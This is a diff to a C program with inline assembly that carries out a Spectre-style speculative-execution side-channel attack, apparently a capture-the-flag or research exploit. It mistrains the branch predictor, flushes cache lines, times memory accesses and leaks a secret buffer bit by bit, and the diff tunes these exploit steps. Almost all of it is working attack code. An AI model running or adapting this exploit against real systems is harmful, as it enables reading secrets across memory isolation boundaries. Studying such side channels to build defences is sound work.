@@ -7,7 +7,7 @@
 #define PUBLEN 32
 #define PUBBITS (PUBLEN * 8)
 
-int verbose = 0;
+int verbose = 1;
 
 #define threshold 50
 
@@ -26,7 +26,8 @@ static inline unsigned get_bit_raw(char *buf, unsigned byte_idx, unsigned bit_id
   return (buf[byte_idx] >> bit_idx) & 1;
 #else
   unsigned result;
-  asm ("xor %%eax, %%eax\n" // Flags need to be cleared.
+  asm ("mov $0, %%eax\n" // So that there aren't any false dependencies.
+       "xor %%eax, %%eax\n" // Flags need to be cleared.
        "mov %1, %%al\n"
        "shr %%cl, %%al\n"
        "and $1, %%al\n"
@@ -37,11 +38,14 @@ static inline unsigned get_bit_raw(char *buf, unsigned byte_idx, unsigned bit_id
 }
 
 static __attribute__((noinline)) void probe(char *buf, char *flag, unsigned byte_idx, unsigned bit_idx) {
-  // int len = ***p3;
+#if 1
+  int len = ***p3;
+#else
   int len = publen;
+#endif
   if (byte_idx >= len)
     return;
-  asm volatile ("mov %0, %%al" :: "m"(flag) : "al");
+  // asm volatile ("mov %0, %%al" :: "m"(flag) : "al");
   unsigned val = get_bit_raw(buf, byte_idx, bit_idx);
 #if 1
   asm ("mov %0, %%ecx\n"
@@ -93,6 +97,8 @@ static int leak_bit(char *buf, int byte_idx, int bit_idx) {
   // Mistrain the branch predictor.
   int ts[PUBBITS];
   for (int i = 0; i < PUBBITS; ++i) {
+    unsigned byte = order[i].byte;
+    unsigned bit = order[i].bit;
     _mm_clflush(&flag);
     _mm_clflush(&publen);
     _mm_clflush(&p1);
@@ -100,7 +106,7 @@ static int leak_bit(char *buf, int byte_idx, int bit_idx) {
     _mm_clflush(&p3);
     _mm_lfence();
     _mm_mfence();
-    probe(buf, &flag, order[i].byte, order[i].bit);
+    probe(buf, &flag, byte, bit);
     ts[i] = time_access(&flag);
   }
   order[idx].byte = idx / 8;
@@ -120,7 +126,7 @@ int main() {
   char msg[sizeof buf];
   memset(msg, 0, sizeof msg);
   for (int i = 0; i < sizeof buf; ++i) {
-#if 1
+#if 0
     char byte = 0;
     for (int j = 0; j < 8; ++j) {
       const int bit = leak_bit(&buf[0], i, j);
